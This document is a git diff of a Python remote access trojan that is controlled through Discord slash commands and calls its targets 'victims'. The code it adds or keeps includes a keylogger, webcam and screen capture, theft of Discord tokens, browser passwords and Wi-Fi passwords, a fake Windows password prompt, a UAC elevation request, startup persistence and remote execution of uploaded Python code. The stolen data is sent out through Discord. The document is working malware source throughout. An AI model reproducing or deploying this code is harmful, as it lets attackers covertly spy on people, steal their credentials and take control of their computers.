@@ -1,7 +1,7 @@
 import discord 
 import json 
 import subprocess 
-import asyncio 
+import asyncio
 import ctypes 
 import os 
 import threading 
@@ -72,7 +72,7 @@ with urlopen("http://ipinfo.io/json") as url:
 
 
 
-weblink = "---https://yourweb.000webhost.com---"
+weblink = "your 000webhost link"
 
 
     
@@ -174,8 +174,10 @@ while status == False:
 
 is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 from sys import executable
+exename = executable.split('\\')
+exename = (exename[-1])
 subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\Programs\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-subprocess.run(f'start "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\Programs\Startup\""{executable}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+#subprocess.run(f'start "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\Programs\Startup\{exename}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 
 def critproc():
@@ -198,7 +200,7 @@ async def on_slash_command_error(ctx, error):
 async def on_command_error(cmd, error):
     if isinstance(error, discord.ext.commands.errors.CommandNotFound):
         pass
-
+global stop_threads
 async def activity(client):
     while True:
         if stop_threads:
@@ -270,91 +272,65 @@ def MuteVolume():
 
 global stop_threads
 
-@slash.slash(name="commands", description="do commands help", guild_ids=g)
-async def commands_command(ctx: SlashContext, cmd: str):
+@slash.slash(name="stopngrok", description="stop ngrok", guild_ids=g)
+async def stopngrok_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        global stopkey
+            global ngrokMode
+            ngrokMode = False
+            ngrok_tunnel = "ngrok has stoped"
+            await ctx.send("ngrok stoped")
 
-        if (cmd == "info"):
+
+@slash.slash(name="ngroklink", description="send ngrok link", guild_ids=g)
+async def ngroklink_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
             try:
-                url = 'http://ipinfo.io/json'
-                response = urlopen(url)
-                data = json.load(response)
-                UsingVPN = json.load(urlopen("http://ip-api.com/json?fields=proxy"))['proxy']
-                googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
-                process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
-                wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\n").strip()
-                process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
-                wtype = process2.communicate()[0].decode().strip("Caption\n").strip()
+                await ctx.send(f"link {ngrok_tunnel}")
+            except:
+                await ctx.send("there is no link")
 
-                userdata = f"```fix\n------- {os.getlogin()} -------\nComputername: {os.getenv('COMPUTERNAME')}\nIP: {data['ip']}\nUsing VPN?: {UsingVPN}\nOrg: {data['org']}\nCity: {data['city']}\nRegion: {data['region']}\nPostal: {data['postal']}\nWindowskey: {wkey}\nWindows Type: {wtype}\n```**Map location: {googlemap}**\n"
-                await ctx.send(userdata)
-            except:await ctx.send("error trying to get info")      
-        elif (cmd == "kill"):
-            for y in range(len(on_ready.total)): 
-                if "session" in on_ready.total[y]:
-                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
-                    await channel_to_delete.delete()
-                else:
-                    pass
-            await ctx.send(f"Killed all the inactive sessions")
-        elif (cmd == "exit"):
-                buttons = [
-                        create_button(
-                            style=ButtonStyle.green,
-                            label="✔"
-                        ),
-                        create_button(
-                            style=ButtonStyle.red,
-                            label="X"
-                        ),
-                    ]
-                action_row = create_actionrow(*buttons)
-                await ctx.send("Are you sure you want to exit the program on your victims pc?", components=[action_row])
 
-                res = await client.wait_for('button_click')
-                if res.component.label == "✔":
-                    await ctx.send(content="Exited the program!", hidden=True)
-                    os._exit(0)
-                else:
-                    await ctx.send(content="Cancelled the exit", hidden=True)
-        elif (cmd == "startkeylog"):
-                    import os
-                    from pynput.keyboard import Key, Listener
-                    import logging
-                    stopkey = False
-                    temp = os.getenv("TEMP")
-                    log_dir = temp
-                    logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
-                                        level=logging.DEBUG, format='%(asctime)s: %(message)s')
-                    def keylog():
-                        def on_press(key):
-                            logging.info(str(key))
-                        with Listener(on_press=on_press) as listener:
-                            listener.join()
-                            if stopkey == True:
-                                return
-                    import threading
-                    global test
-                    test = threading.Thread(target=keylog)
-                    test._running = True
-                    test.daemon = True
-                    test.start()
-                    await ctx.send("Keylogger Started!")
-        elif (cmd == "stopkeylog"):
-            stopkey = True
-            test._running = False
-            await ctx.send("Keylogger Stopped!")
-        elif (cmd == "dumpkeylog"):
-                file_keys = os.path.join(os.getenv("TEMP") + "/key_log.txt")
-                file = discord.File(file_keys, filename=file_keys)
-                await ctx.send("Successfully dumped all the logs", file=file)
-                os.remove(file_keys)
-        elif (cmd == "deletekeylogs"):
-            keyLogFile = (os.getenv("TEMP") + "/key_log.txt")
-            (os.remove(keyLogFile))
-            await ctx.send("deleted")
-        elif (cmd == "discordtoken"):
+
+@slash.slash(name="camshot", description="dump key loggs", guild_ids=g)
+async def dumpkeylog_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
+                import os
+                import time
+                import cv2
+                temp = (os.getenv('TEMP'))
+                camera_port = 0
+                camera = cv2.VideoCapture(camera_port)
+                #time.sleep(0.1)
+                return_value, image = camera.read()
+                cv2.imwrite(temp + r"\temp.png", image)
+                del(camera)
+                file = discord.File(temp + r"\temp.png", filename="temp.png")
+                await ctx.send("[*] Command successfuly executed", file=file)
+
+
+@slash.slash(name="winstop", description="winstart stop windows logg", guild_ids=g)
+async def winstop_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
+            global stop_threads
+            stop_threads = True
+            await ctx.send("Window logging for this session stopped")
+            game = discord.Game(f"Window logging stopped")
+            await client.change_presence(status=discord.Status.online, activity=game)  
+
+
+@slash.slash(name="winstart", description="winstart start windows logg", guild_ids=g)
+async def winstart_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
+            global stop_threads
+            stop_threads = False
+            threading.Thread(target=between_callback, args=(client,)).start()
+            await ctx.send("Window logging for this session started")
+
+
+
+@slash.slash(name="discordtoken", description="send discord tokens", guild_ids=g)
+async def discordtoken_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
                 await ctx.send(f"extracting tokens...")
                 tokens = []
                 saved = ""
@@ -406,43 +382,57 @@ async def commands_command(ctx: SlashContext, cmd: str):
                     await ctx.send(f"**Token(s) succesfully grabbed:** \n{saved}")
                 else:
                     await ctx.send(f"**User didn't have any stored tokens**")
-        elif (cmd == "windowstart"):
-            stop_threads = False
 
-            threading.Thread(target=between_callback, args=(client,)).start()
-            await ctx.send("Window logging for this session started")
-        elif (cmd == "windowstop"):
-            stop_threads = True
 
-            await ctx.send("Window logging for this session stopped")
-            game = discord.Game(f"Window logging stopped")
-            await client.change_presence(status=discord.Status.online, activity=game)       
-        elif (cmd == "campic"):
-                import os
-                import time
-                import cv2
-                temp = (os.getenv('TEMP'))
-                camera_port = 0
-                camera = cv2.VideoCapture(camera_port)
-                #time.sleep(0.1)
-                return_value, image = camera.read()
-                cv2.imwrite(temp + r"\temp.png", image)
-                del(camera)
-                file = discord.File(temp + r"\temp.png", filename="temp.png")
-                await ctx.send("[*] Command successfuly executed", file=file)
-        elif (cmd == "stopngrok"):
-            global ngrokMode
-            ngrokMode = False
-            ngrok_tunnel = "ngrok has stoped"
-            await ctx.send("ngrok stoped")
-        elif (cmd == "ngroklink"):
-            try:
-                await ctx.send(f"link {ngrok_tunnel}")
-            except:
-                await ctx.send("there is no link")
-        elif(cmd == "help"):
-            print(help)
-        else:
+
+
+@slash.slash(name="deletekeylog", description="delete key loggs", guild_ids=g)
+async def deletekeylog_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
+            keyLogFile = (os.getenv("TEMP") + "/key_log.txt")
+            (os.remove(keyLogFile))
+            await ctx.send("deleted")
+
+
+
+@slash.slash(name="dumpkeylog", description="dump key loggs", guild_ids=g)
+async def dumpkeylog_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
+                file_keys = os.path.join(os.getenv("TEMP") + "/key_log.txt")
+                file = discord.File(file_keys, filename=file_keys)
+                await ctx.send("Successfully dumped all the logs", file=file)
+                os.remove(file_keys)
+
+
+@slash.slash(name="startkeylog", description="start key logger", guild_ids=g)
+async def startkeylog_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
+        import os
+        from pynput.keyboard import Key, Listener
+        import logging
+        stopkey = False
+        temp = os.getenv("TEMP")
+        log_dir = temp
+        logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
+                            level=logging.DEBUG, format='%(asctime)s: %(message)s')
+        def keylog():
+            def on_press(key):
+                logging.info(str(key))
+            with Listener(on_press=on_press) as listener:
+                listener.join()
+                if stopkey == True:
+                    return
+        import threading
+        global test
+        test = threading.Thread(target=keylog)
+        test._running = True
+        test.daemon = True
+        test.start()
+        await ctx.send("Keylogger Started!")
+
+@slash.slash(name="exit", description="exit program", guild_ids=g)
+async def exit_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
                 buttons = [
                         create_button(
                             style=ButtonStyle.green,
@@ -454,13 +444,88 @@ async def commands_command(ctx: SlashContext, cmd: str):
                         ),
                     ]
                 action_row = create_actionrow(*buttons)
-                await ctx.send("thats not a command, do you want to show help?", components=[action_row])
+                await ctx.send("Are you sure you want to exit the program on your victims pc?", components=[action_row])
 
                 res = await client.wait_for('button_click')
                 if res.component.label == "✔":
-                    await ctx.send(content="help!", hidden=True)
+                    await ctx.send(content="Exited the program!", hidden=True)
+                    os._exit(0)
                 else:
-                    await ctx.send(content="Cancelled the help", hidden=True)
+                    await ctx.send(content="Cancelled the exit", hidden=True)
+
+
+
+
+@slash.slash(name="kill", description="kill sessions", guild_ids=g)
+async def kill_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
+            for y in range(len(on_ready.total)): 
+                if "session" in on_ready.total[y]:
+                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
+                    await channel_to_delete.delete()
+                else:
+                    pass
+            await ctx.send(f"Killed all the inactive sessions")
+
+
+
+
+@slash.slash(name="info", description="general info", guild_ids=g)
+async def info_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
+            try:
+                url = 'http://ipinfo.io/json'
+                response = urlopen(url)
+                data = json.load(response)
+                UsingVPN = json.load(urlopen("http://ip-api.com/json?fields=proxy"))['proxy']
+                googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
+                process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+                wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\n").strip()
+                process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+                wtype = process2.communicate()[0].decode().strip("Caption\n").strip()
+
+                userdata = f"```fix\n------- {os.getlogin()} -------\nComputername: {os.getenv('COMPUTERNAME')}\nIP: {data['ip']}\nUsing VPN?: {UsingVPN}\nOrg: {data['org']}\nCity: {data['city']}\nRegion: {data['region']}\nPostal: {data['postal']}\nWindowskey: {wkey}\nWindows Type: {wtype}\n```**Map location: {googlemap}**\n"
+                await ctx.send(userdata)
+            except:await ctx.send("error trying to get info") 
+
+
+
+import wx 
+import wx.html2 
+
+class MyBrowser(wx.Dialog): 
+    def __init__(self, *args, **kwds): 
+        wx.Dialog.__init__(self, *args, **kwds) 
+        sizer = wx.BoxSizer(wx.VERTICAL) 
+        self.browser = wx.html2.WebView.New(self) 
+        sizer.Add(self.browser, 1, wx.EXPAND, 10) 
+        self.SetSizer(sizer) 
+        self.SetSize((700, 700))
+
+
+
+@slash.slash(name="webwindow", description="open a web withow the url in a window", guild_ids=g)
+async def webwindow_command(ctx: SlashContext, url: str):
+    if ctx.channel.name == channel_name:
+        if url.startswith("http://") or url.startswith("https://"):
+            try:
+                ctx.send("web window started")
+                app = wx.App() 
+                dialog = MyBrowser(None, -1)
+                dialog.browser.LoadURL(url) 
+                dialog.Show() 
+                app.MainLoop()
+            except Exception as e:
+                ctx.send("```try other link```")
+                ctx.send(e)
+        else:
+            ctx.send("you need to put https:// or http://")
+
+
+
+
+
+
 
 
 
@@ -482,7 +547,7 @@ def get_dims(cap, res='1080p'):
     return width, height
 
 
-@slash.slash(name="python", description="write a script or write a path to the script", guild_ids=g)
+@slash.slash(name="python", description="takes a video of their webcam", guild_ids=g)
 async def python_command(ctx: SlashContext, script: str):
     if ctx.channel.name == channel_name:
             from io import StringIO
@@ -691,9 +756,35 @@ async def Shell_command(ctx: SlashContext, command: str):
 @slash.slash(name="Write", description="Make the user type what ever you want", guild_ids=g)
 async def Write_command(ctx: SlashContext, message: str):
     if ctx.channel.name == channel_name:
-        await ctx.send(f"Typing. . .")
-        for letter in message:
-            pyautogui.typewrite(letter);sleep(0.0001)
+        import pyautogui
+        import time
+        buttons = [
+                        create_button(
+                            style=ButtonStyle.green,
+                            label="✔"
+                        ),
+                        create_button(
+                            style=ButtonStyle.red,
+                            label="X"
+                        ),
+        ]
+        action_row = create_actionrow(*buttons)
+        await ctx.send("You want to press enter when finish writing?", components=[action_row])
+
+        res = await client.wait_for('button_click')
+        if res.component.label == "✔":
+                    await ctx.send(content="Press enter True", hidden=True)
+                    pressEnter = True
+        else:
+                    await ctx.send(content="Press enter False", hidden=True)
+        try:
+            await ctx.send(f"Typing. . .")
+            for letter in message:
+                pyautogui.typewrite(letter);sleep(0.00001)
+            if pressEnter == True:
+                pyautogui.press('enter')
+        except Exception as e:
+                await ctx.send(f"Error\n```\n{e}```")
         await ctx.send(f"Done typing\n```\n{message}```")
 
 
@@ -708,6 +799,17 @@ async def Clipboard_command(ctx: SlashContext):
         except:
             await ctx.send(f'Clip format is not valid')
 
+@slash.slash(name="hokeys", description="hokeys", guild_ids=g)
+async def hokeys_command(ctx: SlashContext, key1: str,key2: str,times: int=1):
+    if ctx.channel.name == channel_name:
+        import pyautogui
+        try:
+            await ctx.send("pressing")
+            for i in range(times):
+                pyautogui.hotkey(key1, key2)
+            await ctx.send(f"press {key1}  {key2}   {times} times")
+        except Exception as e:
+            await ctx.send(e)
 
 @slash.slash(name="AdminCheck", description=f"check if DiscordRAT has admin perms", guild_ids=g)
 async def AdminCheck_command(ctx: SlashContext):
@@ -797,44 +899,25 @@ async def MessageBox_command(ctx: SlashContext, message: str):
             await select_ctx.edit_origin(content=f"Sent an Question Message Asking {message}")
 
 
-@slash.slash(name="Play", description="Play a chosen youtube video in background", guild_ids=g)
-async def Play_command(ctx: SlashContext, youtube_link: str):
+
+
+@slash.slash(name="AdminRequest", description="this will try to get admin", guild_ids=g)
+async def AdminRequest_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        MaxVolume()
-        if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
-            await ctx.send(f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer")
-            os.system(f'start {youtube_link}')
-            while True:
-                def get_all_hwnd(hwnd, mouse):
-                    def winEnumHandler(hwnd, ctx):
-                        if win32gui.IsWindowVisible(hwnd):
-                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
-                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
-                                global pid_process
-                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
-                                return "ok"
-                        else:
-                            pass
-                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
-                        win32gui.EnumWindows(winEnumHandler,None)
-                try:
-                    win32gui.EnumWindows(get_all_hwnd, 0)
-                except:
-                    break
+        import ctypes, sys
+        await ctx.send("trying")
+        def is_admin():
+            try:
+                return ctypes.windll.shell32.IsUserAnAdmin()
+            except:
+                return False
+
+        if is_admin():
+            await ctx.send("`you are admin`")
         else:
-            await ctx.send("Invalid Youtube Link")
-
-
-
-@slash.slash(name="Stop_Play", description="stop the video", guild_ids=g)
-async def Stop_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-        try:
-                ctx.send("stopped the music")
-                os.system(f"taskkill /F /IM {pid_process[1]}")
-        except:
-                ctx.send("A problem when tried to stop music")
-
+            # Re-run the program with admin rights
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+            await ctx.send("`request send`")
 
 @slash.slash(name="AdminForce", description="try and bypass uac and get admin rights", guild_ids=g)
 async def AdminForce_command(ctx: SlashContext):
@@ -885,7 +968,7 @@ async def Startup_command(ctx: SlashContext, reg_name: str):
 
 
 
-@slash.slash(name="WinPhishing", description="try to get admin pass", guild_ids=g)
+@slash.slash(name="WinPhishing", description="Add the program to startup", guild_ids=g)
 async def WinPhishing_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
             await ctx.send("[*] Command successfuly executed")
@@ -903,7 +986,7 @@ async def WinPhishing_command(ctx: SlashContext):
             await ctx.send("password user typed in is: " + result)
 
 
-@slash.slash(name="voice", description="talk with the pc", guild_ids=g)
+@slash.slash(name="voice", description="Add the program to startup", guild_ids=g)
 async def voice_command(ctx: SlashContext, text: str):
     if ctx.channel.name == channel_name:
             await ctx.send("speaking")
@@ -917,6 +1000,7 @@ async def voice_command(ctx: SlashContext, text: str):
 @slash.slash(name="passwords", description="Take all browser saved passwords", guild_ids=g)
 async def passwords_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
+        await ctx.send("trying to get passwords")
         try:
              import subprocess
              import os
@@ -940,7 +1024,7 @@ async def passwords_command(ctx: SlashContext):
 
 
 
-@slash.slash(name="streamcam", description="send a lot of screenshots", guild_ids=g)
+@slash.slash(name="streamcam", description="Add the program to startup", guild_ids=g)
 async def streamcam_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
             await ctx.send("streaming")
@@ -972,7 +1056,7 @@ async def streamcam_command(ctx: SlashContext):
                     continue
 
 
-@slash.slash(name="stopcam", description="stop sending images", guild_ids=g)
+@slash.slash(name="stopcam", description="Add the program to startup", guild_ids=g)
 async def stopcam_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
             await ctx.send("stream stoped")
@@ -982,7 +1066,7 @@ async def stopcam_command(ctx: SlashContext):
             os.system(r"del %temp\temp.png /F")
 
 
-@slash.slash(name="streamscreen", description="stream screen", guild_ids=g)
+@slash.slash(name="streamscreen", description="Add the program to startup", guild_ids=g)
 async def streamscreen_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
             await ctx.send("streaming screen")
@@ -1009,7 +1093,7 @@ async def streamscreen_command(ctx: SlashContext):
                     continue
 
 
-@slash.slash(name="screenstop", description="stopstream", guild_ids=g)
+@slash.slash(name="screenstop", description="Add the program to startup", guild_ids=g)
 async def screenstop_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
             await ctx.send("stoped stream screen")
@@ -1060,7 +1144,7 @@ async def logout_command(ctx: SlashContext):
             os.system("shutdown /l /f")
             await ctx.send("logging off")
 
-@slash.slash(name="critproc", description="log out use", guild_ids=g)
+@slash.slash(name="critproc", description="critproc the program", guild_ids=g)
 async def critproc_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
             import ctypes
@@ -1197,6 +1281,8 @@ async def wifipass_command(ctx: SlashContext):
 @slash.slash(name="history", description="take history webs", guild_ids=g)
 async def history_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
+        try:
+            await ctx.send("history")
             import sqlite3
             import os
             import time
@@ -1226,8 +1312,8 @@ async def history_command(ctx: SlashContext):
                 path = "rmdir " + temp + r"\history12" + " /s /q"
                 os.system(path)
             deleteme()
-
-
+        except Exception as e:
+            await ctx.send(e)
 @slash.slash(name="BlueScreen", description="blue screen pc", guild_ids=g)
 async def BlueScreen_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
@@ -1454,6 +1540,7 @@ async def displayoff_command(ctx: SlashContext):
 @slash.slash(name="displayon", description="display on", guild_ids=g)
 async def displayon_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
+        try:
             import ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
@@ -1467,7 +1554,8 @@ async def displayon_command(ctx: SlashContext):
                 await ctx.send("[*] Command successfuly executed")
             else:
                 await ctx.send("[!] Admin rights are required for this operation")
-
+        except Exception as e:
+            await ctx.send(f"```error```\n {e}")
 
 
 
@@ -1493,7 +1581,7 @@ async def retractCD_command(ctx: SlashContext):
             return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
             
 
-@slash.slash(name="changeDir", description="change directory", guild_ids=g)
+@slash.slash(name="cd", description="change directory", guild_ids=g)
 async def changeDir_command(ctx: SlashContext, dir: str):
     if ctx.channel.name == channel_name:
             import os
@@ -1501,22 +1589,40 @@ async def changeDir_command(ctx: SlashContext, dir: str):
             await ctx.send(f"cd to : {dir}")
 
 @slash.slash(name="notify", description="notify their pc", guild_ids=g)
-async def notify_command(ctx: SlashContext, message: str, title: str, icon_url:str):
+async def notify_command(ctx: SlashContext,app_name:str, message: str, title: str, icon_url:str=None):
     if ctx.channel.name == channel_name:
-        temp = (os.getenv("TEMP"))
-        from plyer import notification
-        image = requests.get(icon_url).content
-        with open(temp + "/app_icon.ico", 'wb') as handler:{
-	            handler.write(image)
-        }     
-        notification.notify(
-            title = title,
-            app_icon = (temp + r"/app_icon.ico"),
-            message = message
-        )
-        await ctx.send("Notification send")
-        os.remove(temp + "/app_icon.ico")
-
+        import plyer.platforms
+        import plyer.platforms.win
+        import plyer.platforms.win.notification
+        await ctx.send("sending")
+        if icon_url != None:
+            try:
+                temp = (os.getenv("TEMP"))
+                from plyer import notification
+                image = requests.get(icon_url).content
+                with open(temp + "/app_icon.ico", 'wb') as handler:{
+                        handler.write(image)
+                }     
+                notification.notify(
+                    app_name = app_name,
+                    title = title,
+                    app_icon = (temp + r"/app_icon.ico"),
+                    message = message
+                )
+                await ctx.send("Notification send")
+                os.remove(temp + "/app_icon.ico")
+            except Exception as e:
+                await ctx.send(f"```error```\n {e}")
+        else:
+            try:  
+                from plyer import notification
+                notification.notify(
+                    app_name = app_name,
+                    title = title,
+                    message = message
+                )
+            except Exception as e:
+                await ctx.send(f"```error```\n {e}")
 @client.event
 async def on_message(message):
     if message.channel.name != channel_name:
@@ -1549,19 +1655,49 @@ async def on_message(message):
             await message.channel.send("[*] Command successfuly executed")
         elif message.content.startswith("!upload"):
             await message.attachments[0].save(message.content[8:])
-            await message.channel.send("saved")
-        else:
-            await message.channel.send("thats not a command")
+            await message.channel.send(f"saved in ```{message.content[8:]}```")
+        elif message.content.startswith("!wallpaper"):
+            import ctypes
+            import os
+            path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
+            await message.attachments[0].save(path)
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
+            await message.channel.send("[*] Command successfuly executed")
+        elif message.content.startswith("!python"):
+            import sys, os
+            temp = (os.getenv("TEMP") + "\win32tempfile")
+            await message.attachments[0].save(temp)
+            await message.channel.send(f"saved in ```{temp}```")
+            from io import StringIO
+            import traceback
+            new_stdout = StringIO()
+            old_stdout = sys.stdout
+            sys.stdout = new_stdout
+            new_stderr = StringIO()
+            old_stderr = sys.stderr
+            sys.stderr = new_stderr
+            if os.path.exists(temp):
+                await message.channel.send("[*] Running python file...")
+                with open(temp, 'r') as f:
+                    python_code = f.read()
+                    try:
+                        exec(python_code)
+                    except Exception as exc:
+                        await message.channel.send(traceback.format_exc())
+            sys.stdout = old_stdout
+            sys.stderr = old_stderr
+            await message.channel.send(f"**output**```{new_stdout.getvalue()}{new_stderr.getvalue()}```")
+            (os.remove(temp))
 
 
 
 
 @slash.slash(name="winsound", description="windows sound their pc", guild_ids=g)
-async def winsound_command(ctx: SlashContext, soundfile: str,times: int):
+async def winsound_command(ctx: SlashContext, soundfilepath: str,times: int):
     if ctx.channel.name == channel_name:
         await ctx.send("Sending sounds")
         n = times
-        temp= (f"C:\Windows\Media\{soundfile}")
+        temp= (f"{soundfilepath}")
         temp2 = (os.getenv("TEMP"))
         f5 = open(temp2 + r"\winsounds.vbs", 'w')
         result = """ Dim oPlayer: Set oPlayer = CreateObject("WMPlayer.OCX"): oPlayer.URL = """ + '"' + temp + '"' """: oPlayer.controls.play: While oPlayer.playState <> 1 WScript.Sleep 100: Wend: oPlayer.close """
@@ -1578,30 +1714,6 @@ async def winsound_command(ctx: SlashContext, soundfile: str,times: int):
         await ctx.send("All sounds send")
 
 
-@slash.slash(name="infectPC", description="its realy hard to user to try delete your rat", guild_ids=g)
-async def infectPC_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-        from sys import executable; msg = "```\n"
-        await ctx.send("infecting please wait")
-        try:
-            subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\Programs\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            subprocess.run(f'copy "{executable}" "{os.getenv("TEMP")}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\Programs\"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\Microsoft\Windows\"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\Microsoft\"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
-            subprocess.run(f'start "{executable}" "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\Programs\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            subprocess.run(f'start "{executable}" "{os.getenv("TEMP")}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            subprocess.run(f'start "{executable}" "{os.getenv("appdata")}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            subprocess.run(f'start "{executable}" "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\Programs\"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            subprocess.run(f'start "{executable}" "{os.getenv("appdata")}\Microsoft\Windows\Start Menu\"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            subprocess.run(f'start "{executable}" "{os.getenv("appdata")}\Microsoft\Windows\"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            subprocess.run(f'start "{executable}" "{os.getenv("appdata")}\Microsoft\"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        except:
-            await ctx.send("a problem when tried to infect or all infection has not completed")
-        await ctx.send("rat copied in multiple directories")
 
 
 
@@ -1718,13 +1830,15 @@ async def gotHacked_command(ctx: SlashContext):
                     root.lift()
                     root.attributes("-topmost", True)
                     root.attributes("-topmost", False)
-                    time.sleep(.01)
+                    time.sleep(.05)
 
             threading.Thread(target=placewindows).start()
 
             root.mainloop()
 
-
+@slash.slash(name="victims", description="send all acive pc's", guild_ids=g)
+async def victims_command(message):
+    await message.channel.send(f"```{os.getlogin()} | {ip} | {country} | {city} || session : {channel_name}```")
 
 
 def tryLogin():
